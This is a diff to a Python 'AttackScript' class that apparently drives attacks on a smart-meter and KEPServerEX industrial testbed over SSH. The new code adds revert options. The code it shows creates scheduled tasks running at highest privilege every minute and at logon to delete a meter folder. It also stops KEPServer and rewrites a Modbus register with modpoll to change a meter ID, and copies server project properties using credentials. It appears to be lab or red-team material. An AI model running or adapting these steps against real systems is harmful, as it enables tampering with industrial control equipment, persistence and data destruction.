@@ -136,14 +136,14 @@ class AttackScript:
         # Return the output
         return ssh_output
 
-    def scheduled_task_delete_files(self, folder_path) -> None:
+    def scheduled_task_delete_files(self, folder_path, revert=True) -> None:
         """
         # NOTE: This is adapted from the previous team. I dont even know if the smartmeter path even exist tbh
         
         Delete the smartmeter path prediodically through task scheduler through the executable attack 1. If the executable doesnt exist in the destination device, try to package this script to exe and transfer the exe remotely
         
         Args:
-            folder_path (str):
+            folder_path (str): path of folder to be deleted
         """
         ip_addrs_in_system: list[str] = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]
         # If the thing is ran locally
@@ -167,12 +167,38 @@ class AttackScript:
                         "Executable not found in remote machine, need to be a windows machine to package this to exe and transfer remotely")
                 self.transfer_exe_remotely()
 
-            executable_file_path = f"{self.MODPOLL_PATH}/{path.basename(__file__).rsplit('.', 1)[0]}.exe"
+            executable_file_path = f"{self.MODPOLL_PATH}\\{path.basename(__file__).rsplit('.', 1)[0]}.exe"
 
             executable_file_parameters = '1'
 
             task_name1 = 'Smart Meter Testing'
             task_name2 = 'Smart Meter Testing 2'
+
+            if revert:
+                # TODO: Delete the exe too, may need error checking?
+                print(executable_file_path)
+                output_cmd = self.ssh_run_command(f'del {executable_file_path}')
+                print(output_cmd)
+                                     
+                output1 = self.ssh_run_command(f'schtasks /delete /tn "{task_name1}" /f')
+                output2 = self.ssh_run_command(f'schtasks /delete /tn "{task_name2}" /f')
+
+                if "SUCCESS:" in output1.split():
+                    print(f"{task_name1} successfully deleted")
+                    print("Ok.")
+                else:
+                    print(output1)
+                    print(f"{task_name1} failed to delete")
+                    print("Fail.")
+                
+                if "SUCCESS:" in output2.split():
+                    print(f"{task_name2} successfully deleted")
+                    print("Ok.")
+                else:
+                    print(output2)
+                    print(f"{task_name2} failed to delete")
+                    print("Fail.")
+                return
 
             # TODO: Run a native command prompt with task scheduler without cmd window appearing
             # task_name3 = 'Smart Meter Testing 3' # Be even more annoying and run the command locally to delete
@@ -205,7 +231,6 @@ class AttackScript:
 
             sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
             sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
-
             # TODO: Test if the task scheduler works.
             command_output_1 = self.ssh_run_command(sch1)
             command_output_2 = self.ssh_run_command(sch2)
@@ -488,15 +513,22 @@ class AttackScript:
             print("File have not been encrypted.")
 
     # Run modpoll to change register 40201 to 26
-    def change_meterID(self) -> None:
+    def change_meterID(self, revert: bool=False) -> None:
         """
         Run modpoll to change register 40201 (Which handle the meter ID) to 26
+        
+        Args:
+            revert (bool): Revert the attack. If True, change meter ID to 25
         """
         self.kep_server_stop()
 
         executable_path = self.MODPOLL_PATH + r"\modpoll.exe"
+        
+        change_meterID = "26"
+        if revert:
+            change_meterID = "25"
 
-        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", "26"]
+        parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", change_meterID]
 
         # FIXME: Try except for running the executable is gone
         print(self.ssh_run_command(f"{executable_path} {' '.join(parameters)}"))
@@ -544,8 +576,7 @@ class AttackScript:
                 # Read and print each line in the file
                 # BUG: Why open KEPServerProperties? And also need to keep the kepserverproperties log somewhere, not in the local server.
                 try:
-                    server = kepconfig.connection.server(host=self.WINDOWS_SERVER_IP, port=57412, user=username,
-                                                         pw=password)
+                    server = kepconfig.connection.server(host=self.WINDOWS_SERVER_IP, port=57412, user=username, pw=password)
                     output = server.get_project_properties()
                     with open(self.COPIED_PATH + "\\KEPServerProperties.txt", "w") as f:
                         f.write(str(output))
@@ -1487,33 +1518,46 @@ class AttackScript:
         Returns:
             bool: True/False based on whether the command `start service` could execute or not.
         """
-        command_output = self.ssh_run_command("sc query KEPServerEXV6")
-        if "STOPPED" in command_output:
-            print("Kepserver is stopped, starting now...")
-            command_output = self.ssh_run_command("sc start KEPServerEXV6")
 
-            counter = 1 # Added counter to make the UI Seem more responsive
-            while "START_PENDING" in command_output:
-                command_output = self.ssh_run_command("sc query KEPServerEXV6")
-                if "FAILED" in command_output:
-                    print("FAILED:", "\nFail.\n")
-                    return False
-                elif "RUNNING" in command_output:
-                    print("Kepserver is running!")
-                    return True
-                else:
-                    print(f"Kepserver is still starting up... waiting 1 more second [{counter}]")
-                    counter += 1
-                    sleep(1)
+        services = ["KEPServerEXV6", "KEPServerEXConfigAPI6", "KEPServerEXLoggerV6"]
+        services_state = [False] * len(services)
 
-        elif "RUNNING" in command_output:
-            print("Kepserver is running!")
-            return True
-        else:
-            print("Something went wrong!")
-            return False
+        for service_index, service in enumerate(services):
+            command_output = self.ssh_run_command(f"sc query {service}")
+            if "STOPPED" in command_output:
+                print(f"{service} is stopped, starting now...")
+                command_output = self.ssh_run_command(f"sc start {service}")
 
-    # Functions for getting status for GUI
+                counter = 1 # Added counter to make the UI Seem more responsive
+                while "START_PENDING" in command_output:
+                    command_output = self.ssh_run_command(f"sc query {service}")
+                    if "FAILED" in command_output:
+                        print("FAILED:", "\nFail.\n")
+                        services_state[service_index] = False
+
+                    elif "RUNNING" in command_output:
+                        print(f"{service} is running!")
+                        return True
+                    else:
+                        print(f"{service} is still starting up... waiting 1 more second [{counter}]")
+                        counter += 1
+                        sleep(1)
+
+            elif "RUNNING" in command_output:
+                print(f"{service} is running!")
+                services_state[service_index] = True
+            else:
+                print(command_output)
+                print("Something went wrong!")
+                services_state[service_index] = False
+
+        for service_index, service in enumerate(services):
+            if services_state[service_index]:
+                print(f"{service} is running now!")
+            else:
+                print(f"{service} is not running.")
+
+        # Functions for getting status for GUI
 
     def kep_get_service_status(self) -> bool:
         """
